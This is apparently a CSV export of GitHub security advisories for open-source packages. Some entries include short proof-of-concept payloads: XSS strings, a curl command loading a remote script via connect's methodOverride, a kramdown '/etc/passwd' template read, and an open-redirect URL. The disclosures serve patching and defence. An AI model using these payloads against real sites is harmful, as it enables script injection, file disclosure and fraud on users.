707,16295,serve-static,GHSA-c3x7-gjmx-r2ff,CVE-2015-1164,https://github.com/advisories/GHSA-c3x7-gjmx-r2ff,low,2020-08-31 22:57:02 UTC,Open Redirect in serve-static,"Versions of `serve-static` prior to 1.6.5 ( or 1.7.x prior to 1.7.2 ) are affected by an open redirect vulnerability on some browsers when configured to mount at the root directory.


## Proof of Concept

A link to `http://example.com//www.google.com/%2e%2e` will redirect to `//www.google.com/%2e%2e`

Some browsers will interpret this as `http://www.google.com/%2e%2e`, resulting in an external redirect.


## Recommendation

Version 1.7.x: Update to version 1.7.2 or later.
Version 1.6.x: Update to version 1.6.5 or later.",npm
708,17984,remarkable,GHSA-f9vc-q3hh-qhfv,CVE-2014-10065,https://github.com/advisories/GHSA-f9vc-q3hh-qhfv,high,2020-08-31 22:56:00 UTC,Content Injection in remarkable,"Versions 1.4.0 and earlier of `remarkable` are affected by a cross-site scripting vulnerability. This occurs because vulnerable versions of `remarkable` did not properly whitelist link protocols, and consequently allowed `javascript:` to be used. 


### Proof of Concept

Markdown Source:
```
[link](<javascript:alert(1)>)
```

Rendered HTML:
```
<a href=""javascript:alert(1)"">link</a>
```


## Recommendation

Update to version 1.4.1 or later",npm
709,16065,marked,GHSA-9cw2-jqp5-7x39,CVE-2014-3743,https://github.com/advisories/GHSA-9cw2-jqp5-7x39,moderate,2020-08-31 22:52:52 UTC,Multiple Content Injection Vulnerabilities in marked,"Versions 0.3.0 and earlier of `marked` are affected by two cross-site scripting vulnerabilities, even when `sanitize: true` is set.

The attack vectors for this vulnerability are GFM Codeblocks and JavaScript URLs.


## Recommendation

Upgrade to version 0.3.1 or later.",npm
710,17416,inert,GHSA-g4xp-36c3-f7mr,CVE-2014-10068,https://github.com/advisories/GHSA-g4xp-36c3-f7mr,moderate,2020-08-31 22:47:41 UTC,Hidden Directories Always Served in inert,"Versions 1.1.1 and earlier of `inert` are vulnerable to an information leakage vulnerability which causes files in hidden directories to be served, even when showHidden is false.

The inert directory handler always allows files in hidden directories to be served, even when `showHidden` is false.


## Recommendation

Update to version >= 1.1.1.",npm
711,16345,hapi,GHSA-363h-vj6q-3cmj,CVE-2014-4671,https://github.com/advisories/GHSA-363h-vj6q-3cmj,moderate,2020-08-31 22:45:35 UTC,Rosetta-Flash JSONP Vulnerability in hapi,"This description taken from the pull request provided by Patrick Kettner.



Versions 6.1.0 and earlier of hapi are vulnerable to a rosetta-flash attack, which can be used by attackers to send data across domains and break the browser same-origin-policy.





## Recommendation

- Update hapi to version 6.1.1 or later.

Alternatively, a solution previously implemented by Google, Facebook, and Github is to prepend callbacks with an empty inline comment. This will cause the flash parser to break on invalid inputs and prevent the issue, and how the issue has been resolved internally in hapi.",npm
712,16202,connect,GHSA-3fw8-66wf-pr7m,CVE-2013-7370,https://github.com/advisories/GHSA-3fw8-66wf-pr7m,low,2020-08-31 22:41:27 UTC,methodOverride Middleware Reflected Cross-Site Scripting in connect,"Connect is a stack of middleware that is executed in order in each request.

The ""methodOverride"" middleware allows the http post to override the method of the request with the value of the ""_method"" post key or with the header ""x-http-method-override"".

Because the user post input was not checked, req.method could contain any kind of value. Because the req.method did not match any common method VERB, connect answered with a 404 page containing the ""Cannot `[method]` `[url]`"" content. The method was not properly encoded for output in the browser.


###Example:
```
~ curl ""localhost:3000"" -d ""_method=<script src=http://nodesecurity.io/xss.js></script>""
Cannot <SCRIPT SRC=HTTP://NODESECURITY.IO/XSS.JS></SCRIPT> /
```

## Recommendation

Update to the newest version of Connect or disable methodOverride. It is not possible to avoid the vulnerability if you have enabled this middleware in the top of your stack.",npm
713,17681,highcharts,GHSA-gr4j-r575-g665,,https://github.com/advisories/GHSA-gr4j-r575-g665,high,2020-08-25 14:04:47 UTC,Cross-Site Scripting in highcharts,"Versions of `highcharts` prior to 7.2.2 or 8.1.1 are vulnerable to Cross-Site Scripting (XSS).  The package fails to sanitize `href` values and does not restrict URL schemes, allowing attackers to execute arbitrary JavaScript in a victim's browser if they click the link.",npm
714,16526,bcrypt,GHSA-5wg4-74h6-q47v,CVE-2020-7689,https://github.com/advisories/GHSA-5wg4-74h6-q47v,moderate,2020-08-20 14:38:49 UTC,Integer Overflow or Wraparound and Use of a Broken or Risky Cryptographic Algorithm in bcrypt,"In bcrypt (npm package) before version 5.0.0, data is truncated wrong when its length is greater than 255 bytes.",npm
715,18540,is-my-json-valid,GHSA-f522-ffg8-j8r6,CVE-2016-2537,https://github.com/advisories/GHSA-f522-ffg8-j8r6,high,2017-10-24 18:33:35 UTC,Regular Expression Denial of Service in is-my-json-valid,"Version of `is-my-json-valid` before 1.4.1 or 2.17.2 are vulnerable to regular expression denial of service (ReDoS) via the email validation function.


## Recommendation

Update to version 1.4.1, 2.17.2 or later.",npm
716,34747,com.typesafe.play:play_2.12,GHSA-cf8j-64h9-6q58,CVE-2020-12480,https://github.com/advisories/GHSA-cf8j-64h9-6q58,moderate,2020-08-18 17:30:25 UTC,CSRF in Play Framework,"In Play Framework 2.6.0 through 2.8.1, the CSRF filter can be bypassed by making CORS simple requests with content types that contain parameters that can't be parsed.",maven
717,17800,dot-prop,GHSA-ff7x-qrg7-qggm,CVE-2020-8116,https://github.com/advisories/GHSA-ff7x-qrg7-qggm,high,2020-07-29 20:56:59 UTC,dot-prop Prototype Pollution vulnerability,Prototype pollution vulnerability in dot-prop npm package versions before 4.2.1 and versions 5.x before 5.1.1 allows an attacker to add arbitrary properties to JavaScript language constructs such as objects.,npm
718,19587,moped,GHSA-f93j-hmcr-jcwh,CVE-2015-4410,https://github.com/advisories/GHSA-f93j-hmcr-jcwh,high,2020-08-19 16:45:49 UTC,Data Injection Vulnerability in moped Rubygem,The Moped::BSON::ObjecId.legal? method in rubygem-moped before commit dd5a7c14b5d2e466f7875d079af71ad19774609b allows remote attackers to cause a denial of service (worker resource consumption) or perform a cross-site scripting (XSS) attack via a crafted string.,rubygems
719,19780,chartkick,GHSA-3j95-fjv2-3m4p,CVE-2020-16254,https://github.com/advisories/GHSA-3j95-fjv2-3m4p,moderate,2020-08-12 14:29:15 UTC,CSS Injection in Chartkick gem,The Chartkick gem through 3.3.2 for Ruby allows Cascading Style Sheets (CSS) Injection (without attribute).,rubygems
720,18135,tinymce,GHSA-vrv8-v4w8-f95h,,https://github.com/advisories/GHSA-vrv8-v4w8-f95h,moderate,2020-08-11 14:55:01 UTC,Cross-site scripting vulnerability in TinyMCE,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor via the clipboard or APIs. This impacts all users who are using TinyMCE 4.9.10 or lower and TinyMCE 5.4.0 or lower.

### Patches
This vulnerability has been patched in TinyMCE 4.9.11 and 5.4.1 by improved HTML parsing and sanitization logic.

### Workarounds
The workarounds available are:
- upgrade to either TinyMCE 4.9.11 or TinyMCE 5.4.1
or
- enable the media plugin, which overrides the default parsing behaviour for iframes
or
- add the following workaround to update the parsing schema rules for iframes:

#### Example: Change the default schema for iframes
```js
setup: function(editor) {
  editor.on('PreInit', function() {
    editor.schema.getSpecialElements()['iframe'] = /</iframe[^>]*>/gi;
  });
}
```

### Acknowledgements
Tiny Technologies would like to thank George Steketee and Chris Davis at [Bishop Fox](https://www.bishopfox.com/) for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes54/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)",npm
721,17203,serialize-javascript,GHSA-hxcc-f52p-wc94,CVE-2020-7660,https://github.com/advisories/GHSA-hxcc-f52p-wc94,high,2020-08-11 17:21:13 UTC,Insecure serialization leading to RCE in serialize-javascript,"serialize-javascript prior to 3.1.0 allows remote attackers to inject arbitrary code via the function ""deleteFunctions"" within ""index.js"". 

An object such as `{""foo"": /1""/, ""bar"": ""a\""@__R-<UID>-0__@""}` was serialized as `{""foo"": /1""/, ""bar"": ""a\/1""/}`, which allows an attacker to escape the `bar` key. This requires the attacker to control the values of both `foo` and `bar` and guess the value of `<UID>`. The UID has a keyspace of approximately 4 billion making it a realistic network attack.",npm
722,29107,datasette,GHSA-q6j3-c4wc-63vw,,https://github.com/advisories/GHSA-q6j3-c4wc-63vw,moderate,2020-08-11 14:54:40 UTC,CSRF tokens leaked in URL by canned query form,"### Impact

The HTML form for a read-only canned query includes the hidden CSRF token field added in #798 for writable canned queries (#698).

This means that submitting those read-only forms exposes the CSRF token in the URL - for example on https://latest.datasette.io/fixtures/neighborhood_search submitting the form took me to:

https://latest.datasette.io/fixtures/neighborhood_search?text=down&csrftoken=CSRFTOKEN-HERE

This token could potentially leak to an attacker if the resulting page has a link to an external site on it and the user clicks the link, since the token would be exposed in the referral logs.

### Patches

A fix for this issue has been released in Datasette 0.46.

### Workarounds

You can fix this issue in a Datasette instance without upgrading by copying the [0.46 query.html template](https://raw.githubusercontent.com/simonw/datasette/0.46/datasette/templates/query.html) into a custom `templates/` directory and running Datasette with the `--template-dir=templates/` option.

### References

Issue 918 discusses this in details: https://github.com/simonw/datasette/issues/918

### For more information

Contact swillison at gmail with any questions.",pip
723,18939,kramdown,GHSA-mqm2-cgpr-p4m6,CVE-2020-14001,https://github.com/advisories/GHSA-mqm2-cgpr-p4m6,critical,2020-08-07 22:27:41 UTC,Unintended read access in kramdown gem,"The kramdown gem before 2.3.0 for Ruby processes the template option inside Kramdown documents by default, which allows unintended read access (such as template=""/etc/passwd"") or unintended embedded Ruby code execution (such as a string that begins with template=""string://<%= `). NOTE: kramdown is used in Jekyll, GitLab Pages, GitHub Pages, and Thredded Forum.",rubygems
724,16351,prismjs,GHSA-wvhm-4hhf-97x9,CVE-2020-15138,https://github.com/advisories/GHSA-wvhm-4hhf-97x9,high,2020-08-07 22:28:30 UTC,Cross-Site Scripting in Prism,"### Impact
The easing preview of the Previewers plugin has an XSS vulnerability that allows attackers to execute arbitrary code in Safari and Internet Explorer.

This impacts all Safari and Internet Explorer users of Prism >=v1.1.0 that use the _Previewers_ plugin (>=v1.10.0) or the _Previewer: Easing_ plugin (v1.1.0 to v1.9.0).

### Patches
This problem is patched in v1.21.0.

### Workarounds
To workaround the issue without upgrading, [disable the easing preview](https://prismjs.com/plugins/previewers/#disabling-a-previewer) on all impacted code blocks. You need Prism v1.10.0 or newer to apply this workaround.

### References
The vulnerability was introduced by this [commit](https://github.com/PrismJS/prism/commit/4303c940d3d3a20e8ce7635bf23331c75060f5c5) on Sep 29, 2015 and fixed by [Masato Kinugawa](https://twitter.com/kinugawamasato) (#2506).

### For more information
If you have any questions or comments about this advisory, please [open an issue](https://github.com/PrismJS/prism/issues).",npm
725,17651,class-transformer,GHSA-6gp3-h3jj-prx4,CVE-2020-7637,https://github.com/advisories/GHSA-6gp3-h3jj-prx4,moderate,2020-04-07 15:47:40 UTC,Prototype pollution in class-transformer,class-transformer through 0.2.3 is vulnerable to Prototype Pollution. The 'classToPlainFromExist' function could be tricked into adding or modifying properties of 'Object.prototype' using a '__proto__' payload.,npm
726,16174,angular,GHSA-5cp4-xmrw-59wf,,https://github.com/advisories/GHSA-5cp4-xmrw-59wf,moderate,2020-08-05 21:47:02 UTC,XSS via JQLite DOM manipulation functions in AngularJS,"### Summary
XSS may be triggered in AngularJS applications that sanitize user-controlled HTML snippets before passing them to `JQLite` methods like `JQLite.prepend`, `JQLite.after`, `JQLite.append`, `JQLite.replaceWith`, `JQLite.append`, `new JQLite` and `angular.element`.

### Description

JQLite (DOM manipulation library that's part of AngularJS) manipulates input HTML before inserting it to the DOM in `jqLiteBuildFragment`.

One of the modifications performed [expands an XHTML self-closing tag](https://github.com/angular/angular.js/blob/418355f1cf9a9a9827ae81d257966e6acfb5623a/src/jqLite.js#L218).

If `jqLiteBuildFragment` is called (e.g. via `new JQLite(aString)`) with user-controlled HTML string that was sanitized (e.g. with [DOMPurify](https://github.com/cure53/DOMPurify)), the transformation done by JQLite may modify some forms of an inert, sanitized payload into a payload containing JavaScript - and trigger an XSS when the payload is inserted into DOM.

This is similar to a bug in jQuery `htmlPrefilter` function that was [fixed in 3.5.0](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/).

### Proof of concept

```javascript
const inertPayload = `<div><style><style/><img src=x onerror=""alert(1337)""/>` 
```
Note that the style element is not closed and `<img` would be a text node inside the style if inserted into the DOM as-is.
As such, some HTML sanitizers would leave the `<img` as is without processing it and stripping the `onerror` attribute.

```javascript
angular.element(document).append(inertPayload);
```
This will alert, as `<style/>` will be replaced with `<style></style>` before adding it to the DOM, closing the style element early and reactivating `img`.

### Patches
The issue is patched in `JQLite` bundled with angular 1.8.0. AngularJS users using JQuery should upgrade JQuery to 3.5.0, as a similar vulnerability [affects jQuery <3.5.0](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2).

### Workarounds
Changing sanitizer configuration not to allow certain tag grouping (e.g. `<option><style></option>`) or inline style elements may stop certain exploitation vectors, but it's uncertain if all possible exploitation vectors would be covered. Upgrade of AngularJS to 1.8.0 is recommended.

### References
https://github.com/advisories/GHSA-mhp6-pxh8-r675
https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2
https://github.com/jquery/jquery/security/advisories/GHSA-jpcq-cgw6-v4j6
https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
https://snyk.io/vuln/SNYK-JS-ANGULAR-570058",npm
727,28085,solidus_api,GHSA-3mvg-rrrw-m7ph,CVE-2020-15109,https://github.com/advisories/GHSA-3mvg-rrrw-m7ph,moderate,2020-08-04 22:17:57 UTC,Ability to change order address without triggering address validations in solidus,"### Impact

This vulnerability allows a malicious customer to craft request data with parameters that allow changing the address of the current order without changing the shipment costs associated with the new shipment.

All stores with at least two shipping zones and different costs of shipment per zone are impacted. 

E.g.
1. Store admin configured the store so that there are two zones in US:
-  East Cost Zone - Shipping Method cost: $1
- West Cost Zone - Shipping Method cost: $10

The attacker user can know that shipping to NY is less expensive than to LA just by testing different addresses in checkout.

2. The attacker user enters any NY shipping address in the address step
3. The attacker user chooses the $1 delivery option
4. The attacker user crafts a request with their real LA address, similar to:

```
// POST #checkout/update:

{
  state: 'payment',
  order: {
    ship_address_attributes: {
      city: 'Los Angeles',
      ...
    }
  }
}
```
5. The attacker user proceeds with checking out with a new address and the $1 shipment costs.

Another scenario where this could be dangerous is:

> You cannot ship products in some zones and you are relying on Solidus Shipping Method building only to filter out unwanted zones. Malicious users can enter an allowed zone's address and change back to an unwanted one in the payment step by crafting a request with some proper ship_address_attributes.

This problem comes from how checkout permitted attributes are structured. We have a single list of attributes that are permitted across the whole checkout, no matter the step that is being submitted.

### Patches

A PR has been attached to fix the security concern for each of all the Solidus supported versions following the rules of the [Solidus Security Policy](https://solidus.io/security).

### Workarounds

When it's not possible to upgrade to a supported patched version, please use this gist to patch the store:

https://gist.github.com/kennyadsl/4618cd9797984cb64f7700a81bda889d",rubygems
728,17356,fastify,GHSA-xw5p-hw6r-2j98,CVE-2020-8192,https://github.com/advisories/GHSA-xw5p-hw6r-2j98,moderate,2020-08-05 14:53:22 UTC,Denial of service in fastify,A denial of service vulnerability exists in Fastify v2.14.1 and v3.0.0-rc.4 that allows a malicious user to trigger resource exhaustion (when the allErrors option is used) with specially crafted schemas.,npm
729,34500,org.springframework.integration:spring-integration-core,GHSA-86qr-9vqc-pgc6,CVE-2020-5413,https://github.com/advisories/GHSA-86qr-9vqc-pgc6,critical,2020-08-05 14:53:06 UTC,Code execution in Spring Integration,"Spring Integration framework provides Kryo Codec implementations as an alternative for Java (de)serialization. When Kryo is configured with default options, all unregistered classes are resolved on demand. This leads to the ""deserialization gadgets"" exploit when provided data contains malicious code for execution during deserialization. In order to protect against this type of attack, Kryo can be configured to require a set of trusted classes for (de)serialization. Spring Integration should be proactive against blocking unknown ""deserialization gadgets"" when configuring Kryo in code.",maven
730,19150,faye-websocket,GHSA-2v5c-755p-p4gv,CVE-2020-15133,https://github.com/advisories/GHSA-2v5c-755p-p4gv,high,2020-07-31 17:40:04 UTC,Missing TLS certificate verification in faye-websocket,"The `Faye::WebSocket::Client` class uses the [`EM::Connection#start_tls`][1]
method in [EventMachine][2] to implement the TLS handshake whenever a `wss:` URL
is used for the connection. This method does not implement certificate
verification by default, meaning that it does not check that the server presents
a valid and trusted TLS certificate for the expected hostname. That means that
any `wss:` connection made using this library is vulnerable to a
man-in-the-middle attack, since it does not confirm the identity of the server
it is connected to.

This has been a requested feature in EventMachine for many years now; see for
example [#275][3], [#378][4], and [#814][5]. In June 2020, [em-http-request][6]
published an [advisory][7] related to this problem and fixed it by [implementing
TLS verification][8] in their own codebase; although EventMachine does not
implement certificate verification itself, it provides an extension point for
the caller to implement it, called [`ssl_verify_peer`][9]. Based on this
implementation, we have incorporated similar functionality into [faye-websocket
for Ruby][10], such that we use the `OpenSSL` module to perform two checks:

- The chain of certificates presented by the server is valid and ultimately
  trusted by your root certificate set -- either your system default root
  certificates, or a set provided at runtime
- The final certificate presented by the server is valid for the hostname used
  in the request URI; if the connection is made via a proxy we use the hostname
  from the request, not the proxy's hostname

After implementing verification in v1.1.6, em-http-request has elected to leave
the `:verify_peer` option switched off by default. We have decided to _enable_
this option by default in faye-websocket, but are publishing a minor release
with added functionality for configuring it. We are mindful of the fact that
this may break existing programs, but we consider it much more important that
all clients have TLS verification turned on by default. A client that is not
carrying out verification is either:

- talking to the expected server, and will not break under this change
- being attacked, and would benefit from being alerted to this fact
- deliberately talking to a server that would be rejected by verification

The latter case includes situations like talking to a non-public server using a
self-signed certificate. We consider this use case to be ""working by accident"",
rather than functionality that was actively supported, and it should be properly
and explicitly supported instead. To that end, we have added two new options to
the `Faye::WebSocket::Client` constructor: `tls.root_cert_file`, and
`tls.verify_peer`.

The `:root_cert_file` option lets you provide a different set of root
certificates in situations where you don't want to use your system's default
root certificates to verify the remote host. It should be a path or an array of
paths identifying the certificates to use instead of the defaults.

```rb
client = Faye::WebSocket::Client.new('wss://example.com/', [], tls: {
  root_cert_file: 'path/to/certificate.pem'
})
```

The `:verify_peer` option lets you turn verification off entirely. This should
be a last resort and we recommend using the `:root_cert_file` option if
possible.

```rb
client = Faye::WebSocket::Client.new('wss://example.com/', [], tls: {
  verify_peer: false
})
```

To get the new behaviour, please upgrade to v0.11.0 of the [Rubygems
package][10]. There are, unfortunately, no workarounds for this issue, as you
cannot enable `:verify_peer` in EventMachine unless the calling library contains
an implementation of `ssl_verify_peer` that actually checks the server's
certificates.

For further background information on this issue, please see [faye#524][12] and
[faye-websocket#129][13]. We would like to thank [Tero Marttila][14] and [Daniel
Morsing][15] for providing invaluable assistance and feedback on this issue.

[1]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:start_tls
[2]: https://rubygems.org/gems/eventmachine
[3]: https://github.com/eventmachine/eventmachine/issues/275
[4]: https://github.com/eventmachine/eventmachine/pull/378
[5]: https://github.com/eventmachine/eventmachine/issues/814
[6]: https://rubygems.org/gems/em-http-request
[7]: https://securitylab.github.com/advisories/GHSL-2020-094-igrigorik-em-http-request
[8]: https://github.com/igrigorik/em-http-request/pull/340
[9]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:ssl_verify_peer
[10]: https://rubygems.org/gems/faye-websocket
[12]: https://github.com/faye/faye/issues/524
[13]: https://github.com/faye/faye-websocket-ruby/pull/129
[14]: https://github.com/SpComb
[15]: https://github.com/DanielMorsing",rubygems
731,19436,faye,GHSA-3q49-h8f9-9fr9,CVE-2020-15134,https://github.com/advisories/GHSA-3q49-h8f9-9fr9,high,2020-07-31 17:39:42 UTC,Missing TLS certificate verification,"Faye uses [em-http-request][6] and [faye-websocket][10] in the Ruby version of
its client. Those libraries both use the [`EM::Connection#start_tls`][1] method
in [EventMachine][2] to implement the TLS handshake whenever a `wss:` URL is
used for the connection. This method does not implement certificate verification
by default, meaning that it does not check that the server presents a valid and
trusted TLS certificate for the expected hostname. That means that any `https:`
or `wss:` connection made using these libraries is vulnerable to a
man-in-the-middle attack, since it does not confirm the identity of the server
it is connected to.

The first request a Faye client makes is always sent via normal HTTP, but later
messages may be sent via WebSocket. Therefore it is vulnerable to the same
problem that these underlying libraries are, and we needed both libraries to
support TLS verification before Faye could claim to do the same. Your client
would still be insecure if its initial HTTPS request was verified, but later
WebSocket connections were not.

This has been a requested feature in EventMachine for many years now; see for
example [#275][3], [#378][4], and [#814][5]. In June 2020, em-http-request
published an [advisory][7] related to this problem and fixed it by [implementing
TLS verification][8] in their own codebase; although EventMachine does not
implement certificate verification itself, it provides an extension point for
the caller to implement it, called [`ssl_verify_peer`][9]. Based on this
implementation, we have incorporated similar functionality into faye-websocket.

After implementing verification in v1.1.6, em-http-request has elected to leave
the `:verify_peer` option switched off by default. We have decided to _enable_
this option by default in Faye, but are publishing a minor release with added
functionality for configuring it. We are mindful of the fact that this may break
existing programs, but we consider it much more important that all clients have
TLS verification turned on by default. A client that is not carrying out
verification is either:

- talking to the expected server, and will not break under this change
- being attacked, and would benefit from being alerted to this fact
- deliberately talking to a server that would be rejected by verification

The latter case includes situations like talking to a non-public server using a
self-signed certificate. We consider this use case to be ""working by accident"",
rather than functionality that was actively supported, and it should be properly
and explicitly supported instead.

We are releasing Faye v1.4.0, which enables verification by default and provides
a way to opt out of it:

```rb
client = Faye::Client.new('https://example.com/', tls: { verify_peer: false })
```

Unfortunately we can't offer an equivalent of the `:root_cert_file` option that
has been added to faye-websocket, because em-http-request does not support it.
If you need to talk to servers whose certificates are not recognised by your
default root certificates, then you need to add its certificate (or another one
that can verify it) to your system's root set.

The same functionality is now supported in the Node.js version, with a `tls`
option whose values will be passed to the `https` and `tls` modules as
appropriate when making connections. For example, you can provide your own CA
certificate:

```js
var client = new faye.Client('https://example.com/', {
  tls: {
    ca: fs.readFileSync('path/to/certificate.pem')
  }
});
```

For further background information on this issue, please see [faye#524][12] and
[faye-websocket#129][13]. We would like to thank [Tero Marttila][14] and [Daniel
Morsing][15] for providing invaluable assistance and feedback on this issue.

[1]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:start_tls
[2]: https://rubygems.org/gems/eventmachine
[3]: https://github.com/eventmachine/eventmachine/issues/275
[4]: https://github.com/eventmachine/eventmachine/pull/378
[5]: https://github.com/eventmachine/eventmachine/issues/814
[6]: https://rubygems.org/gems/em-http-request
[7]: https://securitylab.github.com/advisories/GHSL-2020-094-igrigorik-em-http-request
[8]: https://github.com/igrigorik/em-http-request/pull/340
[9]: https://www.rubydoc.info/github/eventmachine/eventmachine/EventMachine/Connection:ssl_verify_peer
[10]: https://rubygems.org/gems/faye-websocket
[11]: https://faye.jcoglan.com/
[12]: https://github.com/faye/faye/issues/524
[13]: https://github.com/faye/faye-websocket-ruby/pull/129
[14]: https://github.com/SpComb
[15]: https://github.com/DanielMorsing",rubygems
732,36280,org.cryptacular:cryptacular,GHSA-x64g-4xx9-fh6x,CVE-2020-7226,https://github.com/advisories/GHSA-x64g-4xx9-fh6x,high,2020-06-10 20:02:58 UTC,Denial of Service in Cryptacular,"CiphertextHeader.java in Cryptacular before 1.2.4, as used in Apereo CAS and other products, allows attackers to trigger excessive memory allocation during a decode operation, because the nonce array length associated with &quot;new byte&quot; may depend on untrusted input within the header of encoded data.",maven
733,16878,elliptic,GHSA-vh7m-p724-62c2,CVE-2020-13822,https://github.com/advisories/GHSA-vh7m-p724-62c2,high,2020-07-29 20:40:35 UTC,Signature Malleabillity in elliptic,"The Elliptic package before version 6.5.3 for Node.js allows ECDSA signature malleability via variations in encoding, leading '\0' bytes, or integer overflows. This could conceivably have a security-relevant impact if an application relied on a single canonical signature.",npm
734,20431,uvicorn,GHSA-f97h-2pfx-f59f,CVE-2020-7695,https://github.com/advisories/GHSA-f97h-2pfx-f59f,high,2020-07-29 18:07:20 UTC,HTTP response splitting in uvicorn,"This affects all versions of package uvicorn. Uvicorn's implementation of the HTTP protocol for the httptools parser is vulnerable to HTTP response splitting. CRLF sequences are not escaped in the value of HTTP headers. Attackers can exploit this to add arbitrary headers to HTTP responses, or even return an arbitrary response body, whenever crafted input is used to construct HTTP headers.",pip
735,20431,uvicorn,GHSA-33c7-2mpw-hg34,CVE-2020-7694,https://github.com/advisories/GHSA-33c7-2mpw-hg34,high,2020-07-29 18:07:16 UTC,Log injection in uvicorn,"This affects all versions of package uvicorn. The request logger provided by the package is vulnerable to ASNI escape sequence injection. Whenever any HTTP request is received, the default behaviour of uvicorn is to log its details to either the console or a log file. When attackers request crafted URLs with percent-encoded escape sequences, the logging component will log the URL after it's been processed with urllib.parse.unquote, therefore converting any percent-encoded characters into their single-character equivalent, which can have special meaning in terminal emulators. By requesting URLs with crafted paths, attackers can: * Pollute uvicorn's access logs, therefore jeopardising the integrity of such files. * Use ANSI sequence codes to attempt to interact with the terminal emulator that's displaying the logs (either in real time or from a file).",pip
736,39210,org.apache.kylin:kylin-core-common,GHSA-gprm-xqrc-c2j3,CVE-2020-1956,https://github.com/advisories/GHSA-gprm-xqrc-c2j3,high,2020-07-27 22:51:44 UTC,Command Injection in Kylin,"Kylin has some restful apis which will concatenate os command with the user input string, a user is likely to be able to execute any os command without any protection or validation.",maven
737,19844,Pillow,GHSA-cqhg-xjhh-p8hf,CVE-2020-10177,https://github.com/advisories/GHSA-cqhg-xjhh-p8hf,moderate,2020-07-27 21:52:43 UTC,Out-of-bounds reads in Pillow,Pillow before 6.2.3 and 7.x before 7.0.1 has multiple out-of-bounds reads in libImaging/FliDecode.c.,pip
738,19844,Pillow,GHSA-8843-m7mw-mxqm,CVE-2020-10379,https://github.com/advisories/GHSA-8843-m7mw-mxqm,high,2020-07-27 21:52:41 UTC,Buffer overflow in Pillow,"In Pillow before 6.2.3 and 7.x before 7.0.1, there are two Buffer Overflows in libImaging/TiffDecode.c.",pip
739,19844,Pillow,GHSA-vj42-xq3r-hr3r,CVE-2020-10994,https://github.com/advisories/GHSA-vj42-xq3r-hr3r,moderate,2020-07-27 21:52:39 UTC,Out-of-bounds reads in Pillow,"In libImaging/Jpeg2KDecode.c in Pillow before 7.0.0, there are multiple out-of-bounds reads via a crafted JP2 file.",pip
740,19844,Pillow,GHSA-43fq-w8qq-v88h,CVE-2020-11538,https://github.com/advisories/GHSA-43fq-w8qq-v88h,high,2020-07-27 21:52:36 UTC,Out-of-bounds read in Pillow,"In libImaging/SgiRleDecode.c in Pillow through 7.0.0, a number of out-of-bounds reads exist in the parsing of SGI image files, a different issue than CVE-2020-5311.",pip
741,18822,json,GHSA-jphg-qwrw-7w9g,CVE-2020-10663,https://github.com/advisories/GHSA-jphg-qwrw-7w9g,high,2020-07-27 18:08:21 UTC,Unsafe object creation in json RubyGem,"The JSON gem through 2.2.0 for Ruby, as used in Ruby 2.4 through 2.4.9, 2.5 through 2.5.7, and 2.6 through 2.6.5, has an Unsafe Object Creation Vulnerability. This is quite similar to CVE-2013-0269/GHSA-x457-cw4h-hq5f, but does not rely on poor garbage-collection behavior within Ruby. Specifically, use of JSON parsing methods can lead to creation of a malicious object within the interpreter, with adverse effects that are application-dependent.",rubygems
742,20810,apache-airflow,GHSA-j38c-25fj-mr84,CVE-2020-9485,https://github.com/advisories/GHSA-j38c-25fj-mr84,moderate,2020-07-27 16:57:34 UTC,Stored XSS in Apache Airflow,"An issue was found in Apache Airflow versions 1.10.10 and below. A stored XSS vulnerability was discovered in the Chart pages of the the ""classic"" UI.",pip
743,20810,apache-airflow,GHSA-q4p3-qw5c-mhpc,CVE-2020-11983,https://github.com/advisories/GHSA-q4p3-qw5c-mhpc,moderate,2020-07-27 16:57:25 UTC,Multiple stored XSS in RBAC Admin screens in Apache Airflow,"An issue was found in Apache Airflow versions 1.10.10 and below. It was discovered that many of the admin management screens in the new/RBAC UI handled escaping incorrectly, allowing authenticated users with appropriate permissions to create stored XSS attacks.",pip
744,20810,apache-airflow,GHSA-9g2w-5f3v-mfmm,CVE-2020-11982,https://github.com/advisories/GHSA-9g2w-5f3v-mfmm,critical,2020-07-27 16:57:33 UTC,Insecure default config of Celery worker in Apache Airflow,"An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attack can connect to the broker (Redis, RabbitMQ) directly, it was possible to insert a malicious payload directly to the broker which could lead to a deserialization attack (and thus remote code execution) on the Worker.",pip
745,20810,apache-airflow,GHSA-976r-qfjj-c24w,CVE-2020-11981,https://github.com/advisories/GHSA-976r-qfjj-c24w,critical,2020-07-27 16:57:33 UTC,Command injection via Celery broker in Apache Airflow,"An issue was found in Apache Airflow versions 1.10.10 and below. When using CeleryExecutor, if an attacker can connect to the broker (Redis, RabbitMQ) directly, it is possible to inject commands, resulting in the celery worker running arbitrary commands.",pip
746,20810,apache-airflow,GHSA-rvmq-4x66-q7j3,CVE-2020-11978,https://github.com/advisories/GHSA-rvmq-4x66-q7j3,high,2020-07-27 16:57:33 UTC,Remote code execution in Apache Airflow,An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.,pip
747,18631,parse,GHSA-wvh7-5p38-2qfc,,https://github.com/advisories/GHSA-wvh7-5p38-2qfc,moderate,2020-07-23 18:20:10 UTC,Storing Password in Local Storage,"The `setPassword` method (http://parseplatform.org/Parse-SDK-JS/api/2.9.1/Parse.User.html#setPassword) stores the user's password in localStorage as raw text making it vulnerable to anyone with access to your localStorage. We believe this is the only time that password is stored at all. In the documentation under Users > Signing Up, it clearly states, ""We never store passwords in plaintext, nor will we ever transmit passwords back to the client in plaintext.""

Example Code:
```js
async () => {
